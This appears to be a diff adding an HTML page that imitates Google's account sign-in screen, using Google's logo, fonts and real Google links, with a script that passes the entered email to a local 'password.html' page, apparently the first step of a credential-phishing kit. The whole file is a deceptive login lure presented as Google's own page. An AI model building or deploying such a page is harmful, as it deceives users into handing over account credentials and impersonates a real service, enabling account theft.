@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css?family=Google+Sans:400,500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="box">
+        <img id="logo" center src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google 로고">
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+        <div class="inputBox">
+            <input type="email" id="emailInput" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Email or phone</label>
+        </div>
+
+        <a style="color: #1A73E8; font-weight: 500; font-family: Google Sans; text-decoration: none; display: block; margin-bottom: 3rem; font-size: 15px;" href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S1779339043%3A1686013711985752&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&hl=en-US&ifkv=Af_xneEDJqnMdE0PXPQ89qARuqwFCw52dBJWBY-zM1tLS-01e2ugnF7tqmv9ThjQ0zlbkQxRB6u9">Forgot email?</a>
+
+        <p style="font-size: 14px; white-space: nowrap; color: dimgray; font-weight: 500; margin-right: 30px;margin-bottom: 5px;">Not your computer? Use Guest mode to sign in privately.</p>
+
+        <a style="color: #1A73E8; font-size: 15px;font-weight: 500; font-family:Google Sans; text-decoration: none;" href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a>
+        <br><br><br>
+        <a style="color: #1A73E8; font-weight: 500; font-size: 15px;font-family: Google Sans; text-decoration: none; margin-top: 1rem;" href="https://accounts.google.com/signup/v2/createaccount?biz=false&cc=PH&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S1779339043%3A1686013711985752&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&hl=en-US&ifkv=Af_xneH8WjSGRwXuqQR_5s0X32TdpS6LICfWeyltPHUjcQ4AcGys6w486pjehXdsHzWvre5kaYnBSg">Create Account</a>
+        <a href="password.html?email=" id="nextButton">
+            <input style="margin-bottom: 10px; float: right;" type="submit" name="sign-in" value="Next" onclick="storeEmail()">
+        </a>
+        <script>
+            function storeEmail() {
+                var emailInput = document.getElementById("emailInput");
+                var email = emailInput.value;
+
+                var nextButton = document.getElementById("nextButton");
+                nextButton.href += email;
+            }
+        </script>
+    </div>
+</body>
+</html>
